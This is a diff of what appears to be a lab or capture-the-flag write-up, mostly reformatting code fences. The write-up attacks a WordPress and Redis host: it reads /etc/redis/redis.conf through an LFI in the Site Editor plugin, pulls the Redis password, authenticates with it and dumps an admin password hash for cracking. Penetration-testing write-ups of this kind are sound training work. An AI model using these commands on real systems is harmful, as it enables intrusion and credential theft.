@@ -21,6 +21,9 @@ PORT     STATE SERVICE
 6379/tcp open  redis
 
 Nmap done: 1 IP address (1 host up) scanned in 14.06 seconds
+```
+
+```bash
 ┌──(kali㉿kali)-[~/Desktop]
 └─$ nmap $IP -sC -sV -p 22,80,6379                                                                                                  
 Starting Nmap 7.95 ( <https://nmap.org> ) at 2026-01-25 04:50 UTC
@@ -44,6 +47,9 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
 Service detection performed. Please report any incorrect results at <https://nmap.org/submit/> .
 Nmap done: 1 IP address (1 host up) scanned in 18.64 seconds
+```
+
+```bash
 ┌──(kali㉿kali)-[~/Desktop]
 └─$ nmap $IP -sU --top-ports 10   
 Starting Nmap 7.95 ( <https://nmap.org> ) at 2026-01-25 04:51 UTC
@@ -207,6 +213,9 @@ Interesting Finding(s):
 [+] Data Received: 398.557 KB
 [+] Memory used: 264.355 MB
 [+] Elapsed time: 00:00:05
+```
+
+```bash
 ┌──(kali㉿kali)-[~/Desktop]
 └─$ searchsploit wordpress site editor
 ------------------------------------------------------------------------------------------ ---------------------------------
@@ -247,6 +256,9 @@ Leveraging the previously discovered LFI, I accessed `/etc/redis/redis.conf` and
 ┌──(kali㉿kali)-[~/Desktop]                    
 └─$ curl <http://192.168.175.166/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern>
 .php?ajax_path=/etc/redis/redis.conf
+```
+
+```bash
 ┌──(kali㉿kali)-[~/Desktop]
 └─$ curl <http://192.168.175.166/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/etc/redis/redis.conf> | grep -i requirepass
   % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
@@ -254,6 +266,9 @@ Leveraging the previously discovered LFI, I accessed `/etc/redis/redis.conf` and
   0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0# If the master is password protected (using the "requirepass" configuration
 requirepass Ready4Redis?
 100 61899    0 61899    0     0   310k      0 --:--:-- --:--:-- --:--:--  311k
+```
+
+```bash
 ┌──(kali㉿kali)-[~/Desktop]
 └─$ redis-cli -h $IP
 192.168.175.166:6379> AUTH Ready4Redis?
@@ -412,9 +427,14 @@ MariaDB [wordpress]> select * from wp_users;
 +----+------------+------------------------------------+---------------+---------------+------------------+---------------------+---------------------+-------------+--------------+
 |  1 | admin      | $P$Ba5uoSB5xsqZ5GFIbBnOkXA0ahSJnb0 | admin         | test@test.com | <http://localhost> | 2021-07-11 16:35:27 |                     |           0 | admin        |
 +----+------------+------------------------------------+---------------+---------------+------------------+---------------------+---------------------+-------------+--------------+
+```
+
+```bash
 ┌──(kali㉿kali)-[~/Desktop/redis-rogue-server]
 └─$ echo '$P$Ba5uoSB5xsqZ5GFIbBnOkXA0ahSJnb0' > admin_hash.txt
-                                                                                                                                          
+```
+
+```bash
 ┌──(kali㉿kali)-[~/Desktop/redis-rogue-server]
 └─$ hashcat --identify admin_hash.txt                              
 The following hash-mode match the structure of your input hash:
@@ -424,7 +444,7 @@ The following hash-mode match the structure of your input hash:
     400 | phpass                                                     | Generic KDF
 ```
 
-While auditing the system deeper, I discovered a suspicious cronjob named `backup.sh` running as **root** every 3 minutes. The cronjob was configured as `*/3 * * * *` , which differs from `3 * * * *` (the latter only runs at the 3rd minute of every hour).
+While auditing the system deeper, I discovered a suspicious cronjob named backup.sh running as root every 3 minutes. The cronjob was configured as */3 * * * * , which differs from 3 * * * * (the latter only runs at the 3rd minute of every hour).
 
 ```bash
 ╔══════════╣ Check for vulnerable cron jobs
